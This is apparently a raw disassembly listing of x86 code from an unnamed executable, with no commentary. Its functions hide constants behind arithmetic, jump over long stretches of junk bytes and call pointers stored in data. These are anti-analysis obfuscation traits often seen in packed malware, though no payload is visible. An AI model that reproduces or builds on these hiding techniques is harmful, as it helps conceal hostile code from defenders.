  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	and    BYTE PTR [ebx],bl
  4041d7:	push   edi
  4041d8:	push   0x7e7e1b52
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041a2
  4041e2:	aam    0x78
  4041e4:	or     eax,0x4337933c
  4041e9:	bound  esp,QWORD PTR [ebp+0x65]
  4041ec:	sti    
  4041ed:	ins    BYTE PTR es:[edi],dx
  4041ee:	jle    0x40417e
  4041f0:	lds    esp,FWORD PTR [ebx+0x66]
  4041f3:	je     0x40421f
  4041f5:	mov    ds,WORD PTR [eax+0x54c0a4b9]
  4041fb:	jb     0x404259
  4041fd:	mov    al,ds:0xcdd5b549
  404202:	pusha  
  404203:	xor    BYTE PTR [ebp+0x957b267],0xf8
  40420a:	addr16 (bad) 
  40420c:	scas   eax,DWORD PTR es:[edi]
  40420d:	in     eax,dx
  40420e:	aaa    
  40420f:	bound  esp,QWORD PTR [ebx+0x44]
  404212:	mov    ds:0x48b004b6,al
  404217:	(bad)  
  404218:	cdq    
  404219:	push   edx
  40421a:	enter  0x6687,0x3
  40421e:	aas    
  40421f:	inc    edx
  404220:	cmp    bh,BYTE PTR [esi]
  404222:	jge    0x404258
  404224:	mov    ecx,0x2f9a0008
  404229:	fdivr  DWORD PTR [esi-0x41]
  40422c:	daa    
  40422d:	rol    DWORD PTR [edx+0x1d],cl
  404230:	mov    al,0x6a
  404232:	or     BYTE PTR [esp+ebx*2-0x5f],dh
  404236:	ds ss in al,dx
  404239:	aaa    
  40423a:	es inc edi
  40423c:	sub    ebp,edx
  40423e:	das    
  40423f:	outs   dx,DWORD PTR ds:[esi]
  404240:	imul   ebx,DWORD PTR [edi-0x7ec111a1],0xd1b0d777
  40424a:	pusha  
  40424b:	and    esi,edx
  40424d:	jmp    0x8bb4d29d
  404252:	fdivr  DWORD PTR [esi-0x6b540952]
  404258:	in     eax,0x91
  40425a:	js     0x4042d8
  40425c:	jecxz  0x4041ed
  40425e:	lock lea esp,ds:[eax+0x77]
  404263:	add    al,0x66
  404265:	sub    BYTE PTR [esp+esi*1-0x40],al
  404269:	out    dx,eax
  40426a:	popf   
  40426b:	xchg   esi,eax
  40426c:	addr16 lahf 
  40426e:	jecxz  0x40429c
  404270:	jb     0x4042cb
  404272:	adc    DWORD PTR [ebx-0x7176e3bb],0xffffffc4
  404279:	pop    edi
  40427a:	inc    esp
  40427b:	push   ecx
  40427c:	outs   dx,DWORD PTR ds:[esi]
  40427d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40427e:	popa   
  40427f:	fisub  WORD PTR [edi+0x66e3ed05]
  404285:	push   0xffffff9c
  404287:	jae    0x4042fe
  404289:	mov    BYTE PTR [ebp-0x2b],0x56
  40428d:	lahf   
  40428e:	mov    cl,0x56
  404290:	shr    ebx,1
  404292:	cmp    DWORD PTR [ebp+0x5ff4bb31],ebx
  404298:	dec    eax
  404299:	adc    al,0x1d
  40429b:	xchg   DWORD PTR [eax+edx*1],esp
  40429e:	rol    esp,1
  4042a0:	adc    ebp,DWORD PTR [edx]
  4042a2:	and    eax,DWORD PTR [ebp-0x3bb8fd15]
  4042a8:	sar    eax,0xa5
  4042ab:	mov    ds,WORD PTR [edi+esi*2]
  4042ae:	loope  0x4042dd
  4042b0:	(bad)  
  4042b1:	ins    BYTE PTR es:[edi],dx
  4042b2:	push   edi
  4042b3:	push   ecx
  4042b4:	(bad)  
  4042b5:	aaa    
  4042b6:	outs   dx,DWORD PTR ds:[esi]
  4042b7:	xor    ch,ah
  4042b9:	mov    edx,0x8f135def
  4042be:	push   ds
  4042bf:	popf   
  4042c0:	cmc    
  4042c1:	jbe    0x404309
  4042c3:	js     0x404309
  4042c5:	mov    eax,ds:0x5b3a6e82
  4042ca:	jmp    0x40428f
  4042cc:	jp     0x4042f6
  4042ce:	out    0xa,eax
  4042d0:	je     0x404300
  4042d2:	xchg   ebp,eax
  4042d3:	xchg   esp,eax
  4042d4:	mov    ah,dh
  4042d6:	and    dl,BYTE PTR [edi-0x6f240efe]
  4042dc:	outs   dx,DWORD PTR ds:[esi]
  4042dd:	ja     0x4042f7
  4042df:	sar    DWORD PTR [esi-0x22fa196c],0x64
  4042e6:	pop    edx
  4042e7:	rep lods eax,DWORD PTR ds:[esi]
  4042e9:	fild   QWORD PTR [ebp+0x5215765]
  4042ef:	(bad)  [ebp-0x245dd9b1]
  4042f5:	add    eax,0xeb8cbcf5
  4042fa:	sar    BYTE PTR [edi+0xb],1
  4042fd:	ds dec ecx
  4042ff:	xor    cl,bh
  404301:	ja     0x404377
  404303:	push   esi
  404304:	ficomp DWORD PTR [ecx+0x12d1e6a2]
  40430a:	loope  0x404369
  40430c:	xor    ch,BYTE PTR [ebx]
  40430e:	or     al,0xc2
  404310:	jl     0x4042d3
  404312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404313:	jae    0x404296
  404315:	push   edx
  404316:	jo     0x404372
  404318:	(bad)  
  404319:	xchg   edi,eax
  40431a:	pop    edx
  40431b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431c:	stc    
  40431d:	xchg   edi,edi
  40431f:	lahf   
  404320:	lahf   
  404321:	or     bl,BYTE PTR [edx-0x4f]
  404324:	out    0xea,al
  404326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404327:	pushf  
  404328:	push   ecx
  404329:	adc    eax,0xdb939c9a
  40432e:	fst    DWORD PTR [esi]
  404330:	sbb    DWORD PTR [edi-0x10],edi
  404333:	mov    gs,eax
  404335:	mov    WORD PTR ds:0xe6666703,ds
  40433b:	pop    ebx
  40433c:	adc    bh,BYTE PTR [edx-0x42b5f61b]
  404342:	daa    
  404343:	jae    0x40432b
  404345:	xor    eax,0x46370612
  40434a:	xor    DWORD PTR [ebx+0x784d1bb],edx
  404350:	(bad)  
  404351:	sar    BYTE PTR [esi-0x49bf0cf0],1
  404357:	ret    
  404358:	mov    DWORD PTR [ebx+ecx*8-0x50],ebx
  40435c:	push   edi
  40435d:	add    ah,BYTE PTR [ecx-0x38e3dfd3]
  404363:	jno    0x4042f5
  404365:	nop
  404366:	mov    al,ds:0x94d89555
  40436b:	add    BYTE PTR [ebp+0x177481ce],ch
  404371:	xlat   BYTE PTR ds:[ebx]
  404372:	(bad)  
  404373:	jmp    0xed8dab3a
  404378:	jge    0x4043c5
  40437a:	inc    edx
  40437b:	shl    BYTE PTR [ecx+0x15b5d91d],0xa3
  404382:	adc    bl,BYTE PTR [eax]
  404384:	jl     0x40434f
  404386:	dec    ecx
  404387:	inc    esp
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	mov    ds:0xfd4a52a6,al
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x4043ce
  404439:	popf   
  40443a:	mov    bl,0x3a
  40443c:	retf   
  40443d:	jge    0x4043d4
  40443f:	lods   al,BYTE PTR ds:[esi]
  404440:	and    al,0x26
  404442:	mov    dh,0x95
  404444:	pusha  
  404445:	push   edx
  404446:	jge    0x40440f
  404448:	nop
  404449:	js     0x404423
  40444b:	push   ecx
  40444c:	or     eax,ebx
  40444e:	push   edx
  40444f:	pop    edi
  404450:	fadd   DWORD PTR [edi+0x1b]
  404453:	add    DWORD PTR [edi],ebx
  404455:	sbb    BYTE PTR [edx],ah
  404457:	cmc    
  404458:	jmp    0x3a8102c7
  40445d:	(bad)  
  40445e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40445f:	(bad)  
  404460:	cld    
  404461:	adc    al,0xd0
  404463:	test   eax,0x155d2d8a
  404468:	adc    edi,DWORD PTR [ebp-0x64717d52]
  40446e:	repnz leave 
  404470:	mov    ds:0xb4fd750,eax
  404475:	retf   0xd87b
  404478:	ins    DWORD PTR es:[edi],dx
  404479:	loopne 0x404402
  40447b:	(bad)  [eax-0x3d3055a8]
  404481:	ds push ebx
  404483:	bound  ecx,QWORD PTR ds:0x69055848
  404489:	cmp    cl,BYTE PTR cs:[di-0x38]
  40448e:	ja     0x4044df
  404490:	ret    0x788
  404493:	mov    esi,0xd7f6cfe5
  404498:	cmp    ecx,ecx
  40449a:	test   DWORD PTR [edx],ebp
  40449c:	fwait
  40449d:	stos   DWORD PTR es:[edi],eax
  40449e:	unpckhps xmm1,xmm6
  4044a1:	sub    bh,BYTE PTR [edx]
  4044a3:	sub    ebp,esp
  4044a5:	cmp    cl,BYTE PTR [edx-0x225f9126]
  4044ab:	hlt    
  4044ac:	inc    esi
  4044ad:	or     eax,0xa537e816
  4044b2:	push   ecx
  4044b3:	xchg   edx,eax
  4044b4:	pushf  
  4044b5:	sbb    eax,0xff9acc91
  4044ba:	das    
  4044bb:	cmp    al,0xcb
  4044bd:	fistp  QWORD PTR [esi]
  4044bf:	or     ecx,eax
  4044c1:	xor    DWORD PTR [edi*8+0x6c23ac7c],eax
  4044c8:	pop    ecx
  4044c9:	in     al,dx
  4044ca:	call   DWORD PTR [esi+0x4d]
  4044cd:	call   0x869b4042
  4044d2:	and    eax,ebx
  4044d4:	jmp    0x568240fb
  4044d9:	jmp    0x5cac2261
  4044de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044df:	dec    esp
  4044e0:	or     ebx,DWORD PTR [ebx+0x42451a56]
  4044e6:	lock and al,0xb2
  4044e9:	(bad)  
  4044ea:	mov    ebp,0xdcc33877
  4044ef:	mov    al,0x25
  4044f1:	iret   
  4044f2:	inc    esi
  4044f3:	inc    esp
  4044f4:	jle    0x40455d
  4044f6:	retf   
  4044f7:	sbb    ah,BYTE PTR [edi*8+0x3645b9dc]
  4044fe:	pop    edi
  4044ff:	imul   ecx,DWORD PTR [ecx],0x3e8cfca1
  404505:	stc    
  404506:	push   ds
  404507:	ret    0x1f7e
  40450a:	nop
  40450b:	daa    
  40450c:	bound  edi,QWORD PTR ds:0xe809abce
  404512:	rcr    DWORD PTR [ecx+0x4],cl
  404515:	push   0x4ad43a2
  40451a:	popa   
  40451b:	xor    esp,ecx
  40451d:	adc    bl,BYTE PTR [ebp-0x379670e8]
  404523:	xor    ch,al
  404525:	repnz das 
  404527:	sbb    DWORD PTR [eax+0x431a0f],ecx
  40452d:	scas   eax,DWORD PTR es:[edi]
  40452e:	scas   eax,DWORD PTR es:[edi]
  40452f:	add    BYTE PTR [edi+0x63],bh
  404532:	sub    al,0xa8
  404534:	xor    ecx,ebx
  404536:	gs push 0xffffffce
  404539:	fsub   st,st(5)
  40453b:	fwait
  40453c:	retf   0x4a57
  40453f:	hlt    
  404540:	cmp    BYTE PTR [esi-0x1a265410],0x3b
  404547:	fild   DWORD PTR [eax]
  404549:	scas   al,BYTE PTR es:[edi]
  40454a:	adc    eax,DWORD PTR [ebx-0x2]
  40454d:	aam    0xd7
  40454f:	stc    
  404550:	dec    esp
  404551:	inc    eax
  404552:	call   0x5f189c44
  404557:	mov    eax,0x8f2c2d06
  40455c:	cmp    bl,cl
  40455e:	adc    DWORD PTR [ebx-0x457da4c],esp
  404564:	push   esi
  404565:	imul   ecx,esp,0xffffffe5
  404568:	jmp    0x5099:0xd141cf62
  40456f:	pop    ecx
  404570:	fimul  WORD PTR [edx-0x58c88714]
  404576:	fisttp DWORD PTR fs:[eax-0x6dd7f7f4]
  40457d:	pop    ebp
  40457e:	adc    BYTE PTR [edx+0x2d],al
  404581:	loopne 0x40456b
  404583:	int    0xdb
  404585:	adc    ebp,eax
  404587:	mov    esi,0x9b746aa0
  40458c:	sbb    DWORD PTR [ecx-0x1a],edx
  40458f:	mov    ecx,0x4d01e6cf
  404594:	cmp    BYTE PTR [ebx+eiz*8-0x45],0x42
  404599:	add    al,BYTE PTR [eax]
  40459b:	call   0x31de:0x88fa7333
  4045a2:	test   BYTE PTR [edi+esi*8],bl
  4045a5:	int    0x37
  4045a7:	cmp    al,0xa8
  4045a9:	push   ebx
  4045aa:	enter  0x1a50,0xc9
  4045ae:	retf   0x612c
  4045b1:	and    DWORD PTR [ecx+ebx*1+0x62],edx
  4045b5:	adc    DWORD PTR [ecx],eax
  4045b7:	iret   
  4045b8:	ja     0x4045e4
  4045ba:	out    dx,eax
  4045bb:	les    ecx,FWORD PTR [ebp+0x45]
  4045be:	jns    0x4045b3
  4045c0:	cmovp  esi,ebx
  4045c3:	and    DWORD PTR [ebx+0x2c],eax
  4045c6:	sbb    al,0xf7
  4045c8:	out    0x2e,eax
  4045ca:	div    BYTE PTR [edx+eiz*4+0x3bc0f3fa]
  4045d1:	adc    eax,0x9f80c7be
  4045d6:	call   0xac08377a
  4045db:	loopne 0x404646
  4045dd:	scas   al,BYTE PTR es:[edi]
  4045de:	or     al,0x3
  4045e0:	rol    DWORD PTR [ebx],0xf1
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404733
  4046fa:	in     eax,0x17
  4046fc:	mov    edx,0x7e7e2724
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x40468e
  404706:	scas   al,BYTE PTR es:[edi]
  404707:	fidiv  DWORD PTR [edx-0x75]
  40470a:	aad    0x8b
  40470c:	jnp    0x404751
  40470e:	call   0xe53:0xcb6b4986
  404715:	call   0x293:0xaaeb12da
  40471c:	cmc    
  40471d:	sbb    ecx,edx
  40471f:	mov    ch,0xe1
  404721:	push   eax
  404722:	xchg   esp,eax
  404723:	adc    dh,ch
  404725:	push   ebx
  404726:	or     ch,BYTE PTR [edx]
  404728:	into   
  404729:	jl     0x404758
  40472b:	fmul   QWORD PTR [eax-0x7f]
  40472e:	xor    DWORD PTR [esi-0x29],0x64
  404732:	sub    DWORD PTR [edx+0x7],ebx
  404735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404736:	xchg   ecx,eax
  404737:	mov    BYTE PTR ds:0x3e4eab69,cl
  40473d:	jns    0x404739
  40473f:	ins    BYTE PTR es:[edi],dx
  404740:	out    dx,eax
  404741:	add    ecx,DWORD PTR [esi-0xb]
  404744:	in     eax,0x20
  404746:	or     ah,BYTE PTR [esi+0x60ed808a]
  40474c:	push   edi
  40474d:	lods   eax,DWORD PTR ds:[esi]
  40474e:	inc    ecx
  40474f:	(bad)  
  404750:	mov    BYTE PTR fs:[eax+ebx*2],ah
  404754:	lods   al,BYTE PTR ds:[esi]
  404755:	inc    ebx
  404756:	fbstp  TBYTE PTR [ebx+0x7a]
  404759:	mov    ecx,0xa70734b2
  40475e:	sbb    DWORD PTR [ebx],edi
  404760:	cdq    
  404761:	cmc    
  404762:	mov    esp,0x27244386
  404767:	pop    es
  404768:	aam    0xa
  40476a:	mov    DWORD PTR [eax],0x5d167067
  404770:	pop    es
  404771:	sub    ebp,DWORD PTR [ecx]
  404773:	adc    cl,bl
  404775:	add    al,0x99
  404777:	cli    
  404778:	mov    ebp,0x8b43ceb1
  40477d:	dec    edx
  40477e:	stos   DWORD PTR es:[edi],eax
  40477f:	aaa    
  404780:	or     al,0x52
  404782:	cmp    al,0x11
  404784:	push   cs
  404785:	push   eax
  404786:	mov    bh,0x31
  404788:	and    al,BYTE PTR [ecx+0x1a6818d2]
  40478e:	cwde   
  40478f:	in     al,dx
  404790:	dec    esi
  404791:	adc    BYTE PTR [edi+0xd5777bc],0x21
  404798:	push   ebx
  404799:	jne    0x404765
  40479b:	iret   
  40479c:	adc    ecx,esp
  40479e:	dec    ebp
  40479f:	cmp    esi,DWORD PTR [edx*8-0x40967687]
  4047a6:	pop    ebp
  4047a7:	stos   BYTE PTR es:[edi],al
  4047a8:	stc    
  4047a9:	in     al,0x22
  4047ab:	push   es
  4047ac:	xchg   esp,eax
  4047ad:	and    al,0xa2
  4047af:	pop    ecx
  4047b0:	out    0x9a,al
  4047b2:	mov    edx,DWORD PTR [ebx+edi*8+0x2f]
  4047b6:	ret    0xc0e0
  4047b9:	lahf   
  4047ba:	stos   DWORD PTR es:[edi],eax
  4047bb:	outs   dx,DWORD PTR ds:[esi]
  4047bc:	(bad)  [esi+0x10ebadd0]
  4047c2:	pop    ecx
  4047c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c4:	cld    
  4047c5:	pop    esp
  4047c6:	loopne 0x404844
  4047c8:	add    eax,0x63e9f669
  4047cd:	sbb    ebx,DWORD PTR [edi-0x1e81d737]
  4047d3:	mov    ebp,0x10a0e5bc
  4047d8:	mov    bh,0x5f
  4047da:	pushf  
  4047db:	mov    edi,edi
  4047dd:	imul   ecx,DWORD PTR [esi],0xfffffff4
  4047e0:	mov    dh,0x21
  4047e2:	xor    ah,BYTE PTR [esi+0x4]
  4047e5:	ss pop esp
  4047e7:	push   ebp
  4047e8:	in     al,0xef
  4047ea:	shl    BYTE PTR [ecx-0xb],0x6b
  4047ee:	add    DWORD PTR [edx],edx
  4047f0:	aas    
  4047f1:	ret    
  4047f2:	popa   
  4047f3:	or     cl,dh
  4047f5:	(bad)  
  4047f6:	add    bl,BYTE PTR [edx+0x3b]
  4047f9:	and    DWORD PTR [ebx-0x53],edi
  4047fc:	loope  0x40485a
  4047fe:	inc    ecx
  4047ff:	ret    0x9f0f
  404802:	jb     0x404873
  404804:	xor    DWORD PTR [edi],ebp
  404806:	and    BYTE PTR [edx],cl
  404808:	popf   
  404809:	mov    eax,ds:0x63513751
  40480e:	mov    WORD PTR ds:0xf67050d0,?
  404814:	mov    dh,0xd3
  404816:	xor    esp,DWORD PTR [edi]
  404818:	inc    edi
  404819:	xchg   edi,eax
  40481a:	adc    BYTE PTR [eax],ah
  40481c:	pop    ebp
  40481d:	cli    
  40481e:	mov    cl,0x2d
  404820:	cmp    edi,DWORD PTR [ebx]
  404822:	cdq    
  404823:	push   esp
  404824:	xor    bl,al
  404826:	cdq    
  404827:	lods   eax,DWORD PTR ds:[esi]
  404828:	sbb    DWORD PTR [eax-0x60],esp
  40482b:	test   DWORD PTR [esi-0x4ad734d5],ebp
  404831:	add    al,0xe7
  404833:	cli    
  404834:	mov    esp,0xf7236d72
  404839:	jae    0x404843
  40483b:	jnp    0x40482c
  40483d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40483e:	xchg   esi,eax
  40483f:	icebp  
  404840:	sub    eax,0x698706d9
  404845:	sub    eax,0x569b8310
  40484a:	cmc    
  40484b:	ror    DWORD PTR [ecx+0x53],cl
  40484e:	xor    ebx,DWORD PTR [eax+0x53]
  404851:	jb     0x404810
  404853:	adc    DWORD PTR [bx+di+0x6f56],eax
  404858:	stc    
  404859:	in     eax,0x25
  40485b:	or     BYTE PTR [eax-0x4],0x70
  40485f:	inc    eax
  404860:	ins    BYTE PTR es:[edi],dx
  404861:	dec    edi
  404862:	or     cl,BYTE PTR [ebx+0x5775]
  404868:	sub    eax,0x12559b5a
  40486d:	inc    edx
  40486e:	das    
  40486f:	and    al,BYTE PTR [ecx-0x1b]
  404872:	adc    al,0xaa
  404874:	cmp    DWORD PTR ds:0xe25268b3,esi
  40487a:	std    
  40487b:	mov    ebx,0xb58776fd
  404880:	mov    eax,ds:0x61a299b0
  404885:	stc    
  404886:	mov    al,0x79
  404888:	push   ebp
  404889:	fdiv   DWORD PTR [eax+0x4e]
  40488c:	aaa    
  40488d:	xor    DWORD PTR [eax+0x1b],eax
  404890:	pop    eax
  404891:	cmp    ebp,edx
  404893:	pusha  
  404894:	and    dh,BYTE PTR [eax+0xf]
  404897:	in     eax,dx
  404898:	dec    esp
  404899:	jg     0x4048ab
  40489b:	jno    0x40490e
  40489d:	cmc    
  40489e:	sahf   
  40489f:	ins    BYTE PTR es:[edi],dx
  4048a0:	xor    BYTE PTR [esi-0x72f635e9],dh
  4048a6:	scas   al,BYTE PTR es:[edi]
  4048a7:	in     al,0x8a
  4048a9:	lods   eax,DWORD PTR ds:[esi]
  4048aa:	call   0x6405109b
  4048af:	scas   eax,DWORD PTR es:[edi]
  4048b0:	enter  0x8550,0x6c
  4048b4:	add    al,0xe5
  4048b6:	dec    eax
  4048b7:	dec    ebp
  4048b8:	test   DWORD PTR ds:0x977b9eeb,edi
  4048be:	fwait
  4048bf:	shl    cl,cl
  4048c1:	popf   
  4048c2:	jne    0x4048a5
  4048c4:	mov    dl,0x78
  4048c6:	int    0xd8
  4048c8:	call   0x3c4b:0x14961b88
  4048cf:	xchg   ebx,eax
  4048d0:	(bad)  
  4048d1:	(bad)  
  4048d2:	gs dec esi
  4048d4:	loopne 0x40489a
  4048d6:	inc    ebx
  4048d7:	xor    bh,BYTE PTR [esi+ebx*1]
  4048da:	xchg   DWORD PTR [esi*4-0x6bb9db4f],ecx
  4048e1:	ds xchg esp,eax
  4048e3:	int    0x7
  4048e5:	push   ds
  4048e6:	mov    ds:0x716f7830,eax
  4048eb:	test   DWORD PTR [ecx],ebp
  4048ed:	and    al,0x9
  4048ef:	fmul   st,st(2)
  4048f1:	in     al,dx
  4048f2:	scas   al,BYTE PTR es:[edi]
  4048f3:	mov    al,0x1
  4048f5:	ins    BYTE PTR es:[edi],dx
  4048f6:	xor    eax,0x4b444b8e
  4048fb:	fadd   DWORD PTR [ecx-0x767211dd]
  404901:	cwde   
  404902:	mov    esp,0x2549c68b
  404907:	pop    ss
  404908:	iret   
  404909:	ds xchg ebp,eax
  40490b:	jle    0x4048fd
  40490d:	pop    esp
  40490e:	mov    esp,0xe8780516
  404913:	xchg   ecx,eax
  404914:	shl    DWORD PTR [eax+edx*8],cl
  404917:	cmp    al,0x8d
  404919:	out    dx,eax
  40491a:	mov    bl,0x36
  40491c:	mov    edi,0x97d5d84d
  404921:	mov    eax,ds:0x514298db
  404926:	cmp    al,0x7f
  404928:	jmp    0x8c6b:0x3f46c9ac
  40492f:	mov    cl,0xc
  404931:	mov    BYTE PTR [ebx],dl
  404933:	inc    ebx
  404934:	test   DWORD PTR [esi+0x56cdac69],esp
  40493a:	ss popa 
  40493c:	mov    cs,WORD PTR [edi]
  40493e:	mov    ebp,0x38cc6dfa
  404943:	ds jmp 0x404981
  404946:	xchg   esi,eax
  404947:	retf   
  404948:	test   BYTE PTR [ecx-0x17],0xbc
  40494c:	or     BYTE PTR [bx],ch
  40494f:	inc    edx
  404950:	retf   
  404951:	xor    dh,BYTE PTR ds:0xb5676be4
  404957:	adc    eax,0xe077da02
  40495c:	loopne 0x40499f
  40495e:	jmp    0x8f2f:0xd1f704c2
  404965:	xchg   DWORD PTR [eax-0x4e],ebp
  404968:	fdiv   st(6),st
  40496a:	and    DWORD PTR [ecx+0x7],0xffffffd6
  40496e:	pop    edx
  40496f:	xlat   BYTE PTR ds:[ebx]
  404970:	gs jo  0x4049a8
  404973:	xor    eax,0x89645385
  404978:	pop    ss
  404979:	fwait
  40497a:	dec    eax
  40497b:	inc    edi
  40497c:	jbe    0x404933
  40497e:	inc    ebp
  40497f:	imul   edi,DWORD PTR [esi+0x52077e2d],0x3c8d0c56
  404989:	sbb    ebp,DWORD PTR [ebx]
  40498b:	inc    ebx
  40498c:	xchg   al,ah
  40498e:	scas   al,BYTE PTR es:[edi]
  40498f:	in     eax,0xd1
  404991:	pop    edx
  404992:	add    al,0x43
  404994:	cmp    dh,BYTE PTR [ecx]
  404996:	loop   0x4049fe
  404998:	push   ds
  404999:	jmp    0x404945
  40499b:	in     eax,dx
  40499c:	stos   DWORD PTR es:[edi],eax
  40499d:	test   eax,0xc0aeaa05
  4049a2:	sbb    al,0xe4
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e658,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e658
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e658,edx
  4049bf:	cmp    DWORD PTR ds:0x42e658,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e84f
  4049da:	cmp    DWORD PTR ds:0x42e658,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e658
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e658,edx
  4049f4:	cmp    DWORD PTR ds:0x42e658,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42ec6b,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x43034f,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ec67,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x430363,0x43035f
  404a2f:	add    eax,edx
